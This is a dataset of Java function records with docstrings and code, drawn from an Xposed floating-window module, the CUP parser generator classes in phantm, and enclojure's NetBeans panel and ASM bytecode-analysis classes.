{"docstring": "/**\n * Checks the range of the touch coordinates and set the respective side.\n */\n", "func_signal": "private boolean initSnappable(int x, int y)", "code": "{\n\tif ((Math.abs(mOldParam[0] - x) > mSensitivity) ||\n\t\t(Math.abs(mOldParam[1] - y) > mSensitivity)) {\n\t\tmOldParam[0] = x;\n\t\tmOldParam[1] = y;\n\t\tdiscardTimeout();\n\t\treturn false;\n\t}\n\tmOldParam[0] = x;\n\tmOldParam[1] = y;\n\t\n\tif (x < mRange) {\n\t\tmSnap = SNAP_LEFT;\n\t} else if (x > (mScreenWidth - mRange)) {\n\t\tmSnap = SNAP_RIGHT;\n\t} else if (y < mRange) {\n\t\tmSnap = SNAP_TOP;\n\t} else if (y > (mScreenHeight - mRange)) {\n\t\tmSnap = SNAP_BOTTOM;\n\t} else {\n\t\tmSnap = SNAP_NONE;\n\t\treturn false;\n\t}\n\treturn true;\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "/* Android 4.1+ (Start) */\n", "func_signal": "private static void hookLongPressNotif(Class<?> baseStatusBar)", "code": "{\n\tXposedBridge.hookAllMethods(baseStatusBar, \"getNotificationLongClicker\",\n\t\t\tnew XC_MethodReplacement() {\n\t\tprotected Object replaceHookedMethod(MethodHookParam param) throws Throwable {\n\t\t\tfinal Object thiz = param.thisObject;\n\t\t\tfinal Context mContext = (Context) XposedHelpers.findField(\n\t\t\t\t\tthiz.getClass(), \"mContext\").get(thiz);\n\t\t\treturn new View.OnLongClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean onLongClick(final View v) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tfinal Object entry = v.getTag();\t\t\t\t\t\t\t\n\t\t\t\t\t\tfinal Object sbn = XposedHelpers.getObjectField(entry, \"notification\");\n\t\t\t\t\t\tfinal String packageNameF = (String) XposedHelpers.getObjectField(sbn, \"pkg\");\n\t\t\t\t\t\tfinal Notification n = (Notification) XposedHelpers.getObjectField(sbn, \"notification\");\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (packageNameF == null) return false;\n\t\t\t\t\t\tif (v.getWindowToken() == null) return false;\n\n\t\t\t\t\t\tPopupMenu popup = new PopupMenu(mContext, v);\n\t\t\t\t\t\tpopup.getMenu().add(TEXT_APP_INFO);\n\t\t\t\t\t\tif (!mSinglePressEnabled) {\n\t\t\t\t\t\t\tpopup.getMenu().add(TEXT_OPEN_IN_HALO);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tpopup.getMenu().add(TEXT_OPEN_IN_NORMALLY);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tpopup.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {\n\t\t\t\t\t\t\tpublic boolean onMenuItemClick(MenuItem item) {\n\t\t\t\t\t\t\t\tif (item.getTitle().equals(TEXT_APP_INFO)) {\n\t\t\t\t\t\t\t\t\tIntent intent = new Intent(\n\t\t\t\t\t\t\t\t\t\t\tSettings.ACTION_APPLICATION_DETAILS_SETTINGS,\n\t\t\t\t\t\t\t\t\t\t\tUri.fromParts(\"package\", packageNameF,\n\t\t\t\t\t\t\t\t\t\t\t\t\tnull));\n\t\t\t\t\t\t\t\t\tintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n\t\t\t\t\t\t\t\t\t\t\t\tmContext.startActivity(intent);\n\t\t\t\t\t\t\t\t\t\t\t\tcloseNotificationShade(mContext);\n\t\t\t\t\t\t\t\t} else if (item.getTitle().equals(TEXT_OPEN_IN_HALO)) {\n\t\t\t\t\t\t\t\t\tlaunchFloating(n.contentIntent, mContext);\n\t\t\t\t\t\t\t\t\tcloseNotificationShade(mContext);\n\t\t\t\t\t\t\t\t} else if (item.getTitle().equals(TEXT_OPEN_IN_NORMALLY)) {\n\t\t\t\t\t\t\t\t\tlaunch(new Intent(), n.contentIntent, mContext);\n\t\t\t\t\t\t\t\t\tcloseNotificationShade(mContext);\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\treturn true;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\t\t\t\t\t\tpopup.show();\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\treturn false;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t};\n\t\t}\n\t});\n\t\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\NotificationShadeHook.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "/* Android 4.0+ (Start) */\n", "func_signal": "private static void loadIcsHooks(final LoadPackageParam lpp)", "code": "{\n\tClass<?> phoneStatusBar = findClass(\"com.android.systemui.statusbar.phone.PhoneStatusBar\",\n\t\t\tlpp.classLoader);\n\ttry {\n\t\tinjectOldViewTag(phoneStatusBar);\n\t} catch (Throwable e) {\n\t\tXposedBridge.log(Common.LOG_TAG + \"(injectViewTag)\");\n\t\tXposedBridge.log(e);\n\t}\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\NotificationShadeHook.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// stop the handler from continuing\n", "func_signal": "private void discardTimeout()", "code": "{\n\tmTimeoutDone = false;\n\tmTimeoutRunning = false;\n\tmHandler.removeCallbacks(mRunnable);\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "/** Equality comparison. */\n", "func_signal": "public boolean equals(terminal_set other)", "code": "{\n    if (other == null) \n\treturn false;\n    else\n\treturn _elements.equals(other._elements);\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Helper function to test for a null object and throw an exception if\n *  one is found. \n * @param obj the object we are testing.\n */\n", "func_signal": "protected void not_null(Object obj) throws internal_error", "code": "{\n    if (obj == null) \n\tthrow new internal_error(\"Null object used in set operation\");\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Constructor for cloning from another set. \n * @param other the set we are cloning from.\n */\n", "func_signal": "public terminal_set(terminal_set other) \n  throws internal_error", "code": "{\n    not_null(other);\n    _elements = (BitSet)other._elements.clone();\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Produce a new lr_item_core that results from shifting the dot one \n *  position to the right. \n */\n", "func_signal": "public lr_item_core shift_core() throws internal_error", "code": "{\n    if (dot_at_end()) \n\tthrow new internal_error(\n\t  \"Attempt to shift past end of an lr_item_core\");\n\n    return new lr_item_core(_the_production, _dot_pos+1);\n  }", "path": "lib\\cup\\java\\java_cup\\lr_item_core.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Add (union) in a complete set.  \n * @param other the set being added.\n * @return true if this changes the set.\n */\n", "func_signal": "public boolean add(terminal_set other)\n  throws internal_error", "code": "{\n    not_null(other);\n\n    /* make a copy */\n    BitSet copy = (BitSet)_elements.clone();\n\n    /* or in the other set */\n    _elements.or(other._elements);\n\n    /* changed if we are not the same as the copy */\n    return !_elements.equals(copy);\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Remove a terminal if it is in the set.\n * @param sym the terminal being removed.\n */\n", "func_signal": "public void remove(terminal sym) \n  throws internal_error", "code": "{\n    not_null(sym); \n    _elements.clear(sym.index());\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Full constructor.\n * @param prod production this item uses.\n * @param pos  position of the \"dot\" within the item.\n */\n", "func_signal": "public lr_item_core(production prod, int pos) throws internal_error", "code": "{\n    symbol          after_dot = null;\n    production_part part;\n\n    if (prod == null)\n\tthrow new internal_error(\n\t  \"Attempt to create an lr_item_core with a null production\");\n\n    _the_production = prod;\n\n    if (pos < 0 || pos > _the_production.rhs_length())\n\tthrow new internal_error(\n\t  \"Attempt to create an lr_item_core with a bad dot position\");\n\n    _dot_pos = pos;\n\n    /* compute and cache hash code now */\n    _core_hash_cache = 13*_the_production.hashCode() + pos;\n\n    /* cache the symbol after the dot */\n    if (_dot_pos < _the_production.rhs_length())\n\t{\n\t  part = _the_production.rhs(_dot_pos);\n\t  if (!part.is_action())\n\t    _symbol_after_dot = ((symbol_part)part).the_symbol();\n\t}\n  }", "path": "lib\\cup\\java\\java_cup\\lr_item_core.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Determine if this set is an (improper) subset of another.\n * @param other the set we are testing against.\n */\n", "func_signal": "public boolean is_subset_of(terminal_set other)\n  throws internal_error", "code": "{\n    not_null(other);\n\n    /* make a copy of the other set */\n    BitSet copy_other = (BitSet)other._elements.clone();\n\n    /* and or in */\n    copy_other.or(_elements);\n\n    /* if it hasn't changed, we were a subset */\n    return copy_other.equals(other._elements);\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Determine if the set contains a particular terminal. \n * @param sym the terminal symbol we are looking for.\n */\n", "func_signal": "public boolean contains(terminal sym) \n  throws internal_error", "code": "{\n    not_null(sym); \n    return _elements.get(sym.index());\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Generic equality comparison. */\n", "func_signal": "public boolean equals(Object other)", "code": "{\n    if (!(other instanceof terminal_set))\n\treturn false;\n    else\n\treturn equals((terminal_set)other);\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Determine if this set intersects another.\n * @param other the other set in question.\n */\n", "func_signal": "public boolean intersects(terminal_set other)\n   throws internal_error", "code": "{\n     not_null(other);\n\n     /* make a copy of the other set */\n     BitSet copy = (BitSet)other._elements.clone();\n\n     /* xor out our values */\n     copy.xor(this._elements);\n\n     /* see if its different */\n     return !copy.equals(other._elements);\n   }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Full constructor.\n * @param nm the name of the symbol.\n * @param tp a string with the type name.\n */\n", "func_signal": "public symbol(String nm, String tp)", "code": "{\n    /* sanity check */\n    if (nm == null) nm = \"\";\n\n    /* apply default if no type given */\n    if (tp == null) tp = \"Object\";\n\n    _name = nm;\n    _stack_type = tp;\n  }", "path": "lib\\cup\\src\\java_cup\\symbol.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Convert to string. */\n", "func_signal": "public String toString()", "code": "{\n    String result;\n    boolean comma_flag;\n    \n    result = \"{\";\n    comma_flag = false;\n    for (int t = 0; t < terminal.number(); t++)\n\t{\n\t  if (_elements.get(t))\n\t    {\n\t      if (comma_flag)\n\t        result += \", \";\n\t      else\n\t        comma_flag = true;\n\n\t      result += terminal.find(t).name();\n\t    }\n\t}\n    result += \"}\";\n\n    return result;\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Determine if we have a dot before a non terminal, and if so which one \n *  (return null or the non terminal). \n */\n", "func_signal": "public non_terminal dot_before_nt()", "code": "{\n    symbol sym;\n\n    /* get the symbol after the dot */\n    sym = symbol_after_dot();\n\n    /* if it exists and is a non terminal, return it */\n    if (sym != null && sym.is_non_term())\n\treturn (non_terminal)sym;\n    else\n\treturn null;\n  }", "path": "lib\\cup\\java\\java_cup\\lr_item_core.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Generic equality comparison. */\n", "func_signal": "public boolean equals(Object other)", "code": "{\n    if (!(other instanceof lr_item_core))\n\treturn false;\n    else\n\treturn equals((lr_item_core)other);\n  }", "path": "lib\\cup\\java\\java_cup\\lr_item_core.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Convert to a string */\n", "func_signal": "public String toString()", "code": "{\n    /* can't throw here since super class doesn't, so we crash instead */\n    try {\n      return to_simple_string();\n    } catch(internal_error e) {\n\te.crash();\n\treturn null;\n    }\n  }", "path": "lib\\cup\\java\\java_cup\\lr_item_core.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Equality comparison for the core only.  This is separate out because we \n *  need separate access in a super class. \n */\n", "func_signal": "public boolean core_equals(lr_item_core other)", "code": "{\n    return other != null && \n\t     _the_production.equals(other._the_production) && \n\t     _dot_pos == other._dot_pos;\n  }", "path": "lib\\cup\\java\\java_cup\\lr_item_core.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Convert to a string (separated out from toString() so we can call it\n *  from subclass that overrides toString()).\n */\n", "func_signal": "public String to_simple_string() throws internal_error", "code": "{\n    String result;\n    production_part part;\n\n    if (_the_production.lhs() != null && \n\t  _the_production.lhs().the_symbol() != null &&\n\t  _the_production.lhs().the_symbol().name() != null)\n\tresult = _the_production.lhs().the_symbol().name();\n    else\n\tresult = \"$$NULL$$\";\n\n    result += \" ::= \";\n\n    for (int i = 0; i<_the_production.rhs_length(); i++)\n\t{\n\t  /* do we need the dot before this one? */\n\t  if (i == _dot_pos)\n\t    result += \"(*) \";\n\t  \n\t  /* print the name of the part */\n\t  if (_the_production.rhs(i) == null)\n\t    {\n\t      result += \"$$NULL$$ \";\n\t    }\n\t  else\n\t    {\n\t      part = _the_production.rhs(i);\n\t      if (part == null)\n\t\tresult += \"$$NULL$$ \";\n\t      else if (part.is_action())\n\t\tresult += \"{ACTION} \";\n\t      else if (((symbol_part)part).the_symbol() != null &&\n                     ((symbol_part)part).the_symbol().name() != null)\n\t\tresult += ((symbol_part)part).the_symbol().name() + \" \";\n\t      else\n\t\tresult += \"$$NULL$$ \";\n\t    }\n\t}\n\n    /* put the dot after if needed */\n    if (_dot_pos == _the_production.rhs_length())\n\tresult += \"(*) \";\n\n    return result;\n  }", "path": "lib\\cup\\java\\java_cup\\lr_item_core.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Determine if this set is an (improper) superset of another.\n * @param other the set we are testing against.\n */\n", "func_signal": "public boolean is_superset_of(terminal_set other)\n  throws internal_error", "code": "{\n    not_null(other);\n    return other.is_subset_of(this);\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "/** Add a single terminal to the set.  \n * @param sym the terminal being added.\n * @return true if this changes the set.\n */\n", "func_signal": "public boolean add(terminal sym) \n  throws internal_error", "code": "{\n    boolean result;\n\n    not_null(sym); \n\n    /* see if we already have this */ \n    result = _elements.get(sym.index());\n\n    /* if not we add it */\n    if (!result)\n\t_elements.set(sym.index());\n\n    return result;\n  }", "path": "lib\\cup\\java\\java_cup\\terminal_set.java", "repo_name": "colder/phantm", "stars": 76, "license": "other", "language": "java", "size": 16256}
{"docstring": "// Implementation of DocumentListener --------------------------------------\n", "func_signal": "public void changedUpdate(DocumentEvent e)", "code": "{\n    updateTexts(e);\n    if (this.projectNameTextField.getDocument() == e.getDocument()) {\n        firePropertyChange(PROP_PROJECT_NAME, null, this.projectNameTextField.getText());\n    }     \n}", "path": "netbeans\\plugins\\org-enclojure-plugin\\src\\main\\java\\org\\enclojure\\ide\\nb\\clojure\\project\\ClojureTemplatePanelVisual.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "// ------------------------------------------------------------------------\n", "func_signal": "private Object get(final int local)", "code": "{\n    maxLocals = Math.max(maxLocals, local);\n    return local < locals.size() ? locals.get(local) : Opcodes.TOP;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\commons\\AnalyzerAdapter.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Prints a disassembled view of the given attribute.\n * \n * @param attr an attribute.\n */\n", "func_signal": "public void visitAttribute(final Attribute attr)", "code": "{\n    buf.setLength(0);\n    buf.append(tab).append(\"ATTRIBUTE \");\n    appendDescriptor(-1, attr.type);\n\n    if (attr instanceof Traceable) {\n        ((Traceable) attr).trace(buf, null);\n    } else {\n        buf.append(\" : unknown\\n\");\n    }\n\n    text.add(buf.toString());\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\util\\TraceAbstractVisitor.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Constructs a new {@link LineNumberNode}.\n * \n * @param line a line number. This number refers to the source file from\n *        which the class was compiled.\n * @param start the first instruction corresponding to this line number.\n */\n", "func_signal": "public LineNumberNode(final int line, final LabelNode start)", "code": "{\n    super(-1);\n    this.line = line;\n    this.start = start;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\LineNumberNode.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Prints a disassembled view of the given annotation.\n * \n * @param desc the class descriptor of the annotation class.\n * @param visible <tt>true</tt> if the annotation is visible at runtime.\n * @return a visitor to visit the annotation values.\n */\n", "func_signal": "public AnnotationVisitor visitAnnotation(\n    final String desc,\n    final boolean visible)", "code": "{\n    buf.setLength(0);\n    buf.append(tab).append('@');\n    appendDescriptor(FIELD_DESCRIPTOR, desc);\n    buf.append('(');\n    text.add(buf.toString());\n    TraceAnnotationVisitor tav = createTraceAnnotationVisitor();\n    text.add(tav.getText());\n    text.add(visible ? \")\\n\" : \") // invisible\\n\");\n    return tav;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\util\\TraceAbstractVisitor.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Appends an internal name, a type descriptor or a type signature to\n * {@link #buf buf}.\n * \n * @param type indicates if desc is an internal name, a field descriptor, a\n *        method descriptor, a class signature, ...\n * @param desc an internal name, type descriptor, or type signature. May be\n *        <tt>null</tt>.\n */\n", "func_signal": "protected void appendDescriptor(final int type, final String desc)", "code": "{\n    if (type == CLASS_SIGNATURE || type == FIELD_SIGNATURE\n            || type == METHOD_SIGNATURE)\n    {\n        if (desc != null) {\n            buf.append(\"// signature \").append(desc).append('\\n');\n        }\n    } else {\n        buf.append(desc);\n    }\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\util\\TraceAbstractVisitor.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Constructs a new frame with the given size.\n * \n * @param nLocals the maximum number of local variables of the frame.\n * @param nStack the maximum stack size of the frame.\n */\n", "func_signal": "public Frame(final int nLocals, final int nStack)", "code": "{\n    this.values = new Value[nLocals + nStack];\n    this.locals = nLocals;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Merges this frame with the given frame.\n * \n * @param frame a frame.\n * @param interpreter the interpreter used to merge values.\n * @return <tt>true</tt> if this frame has been changed as a result of the\n *         merge operation, or <tt>false</tt> otherwise.\n * @throws AnalyzerException if the frames have incompatible sizes.\n */\n", "func_signal": "public boolean merge(final Frame frame, final Interpreter interpreter)\n        throws AnalyzerException", "code": "{\n    if (top != frame.top) {\n        throw new AnalyzerException(\"Incompatible stack heights\");\n    }\n    boolean changes = false;\n    for (int i = 0; i < locals + top; ++i) {\n        Value v = interpreter.merge(values[i], frame.values[i]);\n        if (v != values[i]) {\n            values[i] = v;\n            changes |= true;\n        }\n    }\n    return changes;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Pushes a value into the operand stack of this frame.\n * \n * @param value the value that must be pushed into the stack.\n * @throws IndexOutOfBoundsException if the operand stack is full.\n */\n", "func_signal": "public void push(final Value value) throws IndexOutOfBoundsException", "code": "{\n    if (top + locals >= values.length) {\n        throw new IndexOutOfBoundsException(\"Insufficient maximum stack size.\");\n    }\n    values[top++ + locals] = value;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Pops a value from the operand stack of this frame.\n * \n * @return the value that has been popped from the stack.\n * @throws IndexOutOfBoundsException if the operand stack is empty.\n */\n", "func_signal": "public Value pop() throws IndexOutOfBoundsException", "code": "{\n    if (top == 0) {\n        throw new IndexOutOfBoundsException(\"Cannot pop operand off an empty stack.\");\n    }\n    return values[--top + locals];\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Sets the value of the given local variable.\n * \n * @param i a local variable index.\n * @param value the new value of this local variable.\n * @throws IndexOutOfBoundsException if the variable does not exist.\n */\n", "func_signal": "public void setLocal(final int i, final Value value)\n        throws IndexOutOfBoundsException", "code": "{\n    if (i >= locals) {\n        throw new IndexOutOfBoundsException(\"Trying to access an inexistant local variable\");\n    }\n    values[i] = value;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Returns the value of the given local variable.\n * \n * @param i a local variable index.\n * @return the value of the given local variable.\n * @throws IndexOutOfBoundsException if the variable does not exist.\n */\n", "func_signal": "public Value getLocal(final int i) throws IndexOutOfBoundsException", "code": "{\n    if (i >= locals) {\n        throw new IndexOutOfBoundsException(\"Trying to access an inexistant local variable\");\n    }\n    return values[i];\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "// End of variables declaration//GEN-END:variables\n", "func_signal": "@Override\npublic void addNotify()", "code": "{\n    super.addNotify();\n    //same problem as in 31086, initial focus on Cancel button\n    projectNameTextField.requestFocus();\n}", "path": "netbeans\\plugins\\org-enclojure-plugin\\src\\main\\java\\org\\enclojure\\ide\\nb\\clojure\\project\\ClojureTemplatePanelVisual.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Constructs a new frame that is identical to the given frame.\n * \n * @param src a frame.\n */\n", "func_signal": "public Frame(final Frame src)", "code": "{\n    this(src.locals, src.values.length - src.locals);\n    init(src);\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Returns a string representation of this frame.\n * \n * @return a string representation of this frame.\n */\n", "func_signal": "public String toString()", "code": "{\n    StringBuffer b = new StringBuffer();\n    for (int i = 0; i < getLocals(); ++i) {\n        b.append(getLocal(i));\n    }\n    b.append(' ');\n    for (int i = 0; i < getStackSize(); ++i) {\n        b.append(getStack(i).toString());\n    }\n    return b.toString();\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Creates a new {@link AnalyzerAdapter}.\n * \n * @param owner the owner's class name.\n * @param access the method's access flags (see {@link Opcodes}).\n * @param name the method's name.\n * @param desc the method's descriptor (see {@link Type Type}).\n * @param mv the method visitor to which this adapter delegates calls. May\n *        be <tt>null</tt>.\n */\n", "func_signal": "public AnalyzerAdapter(\n    final String owner,\n    final int access,\n    final String name,\n    final String desc,\n    final MethodVisitor mv)", "code": "{\n    super(mv);\n    locals = new ArrayList();\n    stack = new ArrayList();\n    uninitializedTypes = new HashMap();\n\n    if ((access & Opcodes.ACC_STATIC) == 0) {\n        if (\"<init>\".equals(name)) {\n            locals.add(Opcodes.UNINITIALIZED_THIS);\n        } else {\n            locals.add(owner);\n        }\n    }\n    Type[] types = Type.getArgumentTypes(desc);\n    for (int i = 0; i < types.length; ++i) {\n        Type type = types[i];\n        switch (type.getSort()) {\n            case Type.BOOLEAN:\n            case Type.CHAR:\n            case Type.BYTE:\n            case Type.SHORT:\n            case Type.INT:\n                locals.add(Opcodes.INTEGER);\n                break;\n            case Type.FLOAT:\n                locals.add(Opcodes.FLOAT);\n                break;\n            case Type.LONG:\n                locals.add(Opcodes.LONG);\n                locals.add(Opcodes.TOP);\n                break;\n            case Type.DOUBLE:\n                locals.add(Opcodes.DOUBLE);\n                locals.add(Opcodes.TOP);\n                break;\n            case Type.ARRAY:\n                locals.add(types[i].getDescriptor());\n                break;\n            // case Type.OBJECT:\n            default:\n                locals.add(types[i].getInternalName());\n        }\n    }\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\commons\\AnalyzerAdapter.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/** This method is called from within the constructor to\n * initialize the form.\n * WARNING: Do NOT modify this code. The content of this method is\n * always regenerated by the Form Editor.\n */\n// <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n", "func_signal": "private void initComponents()", "code": "{\n\n    projectNameLabel = new javax.swing.JLabel();\n    projectNameTextField = new javax.swing.JTextField();\n    projectLocationLabel = new javax.swing.JLabel();\n    projectLocationTextField = new javax.swing.JTextField();\n    browseButton = new javax.swing.JButton();\n    createdFolderLabel = new javax.swing.JLabel();\n    createdFolderTextField = new javax.swing.JTextField();\n    projectNameLabel1 = new javax.swing.JLabel();\n    packageNameTextField = new javax.swing.JTextField();\n\n    projectNameLabel.setLabelFor(projectNameTextField);\n    org.openide.awt.Mnemonics.setLocalizedText(projectNameLabel, org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.projectNameLabel.text\")); // NOI18N\n\n    projectNameTextField.addActionListener(new java.awt.event.ActionListener() {\n        public void actionPerformed(java.awt.event.ActionEvent evt) {\n            projectNameTextFieldActionPerformed(evt);\n        }\n    });\n\n    projectLocationLabel.setLabelFor(projectLocationTextField);\n    org.openide.awt.Mnemonics.setLocalizedText(projectLocationLabel, org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.projectLocationLabel.text\")); // NOI18N\n\n    org.openide.awt.Mnemonics.setLocalizedText(browseButton, org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.browseButton.text\")); // NOI18N\n    browseButton.setActionCommand(\"null\");\n    browseButton.addActionListener(new java.awt.event.ActionListener() {\n        public void actionPerformed(java.awt.event.ActionEvent evt) {\n            browseButtonActionPerformed(evt);\n        }\n    });\n\n    createdFolderLabel.setLabelFor(createdFolderTextField);\n    org.openide.awt.Mnemonics.setLocalizedText(createdFolderLabel, org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.createdFolderLabel.text\")); // NOI18N\n\n    createdFolderTextField.setEditable(false);\n\n    projectNameLabel1.setLabelFor(projectNameTextField);\n    org.openide.awt.Mnemonics.setLocalizedText(projectNameLabel1, org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.projectNameLabel1.text\")); // NOI18N\n\n    packageNameTextField.setText(org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.packageNameTextField.text\")); // NOI18N\n    packageNameTextField.addActionListener(new java.awt.event.ActionListener() {\n        public void actionPerformed(java.awt.event.ActionEvent evt) {\n            packageNameTextFieldActionPerformed(evt);\n        }\n    });\n\n    javax.swing.GroupLayout layout = new javax.swing.GroupLayout(this);\n    this.setLayout(layout);\n    layout.setHorizontalGroup(\n        layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n        .addGroup(layout.createSequentialGroup()\n            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                .addGroup(layout.createSequentialGroup()\n                    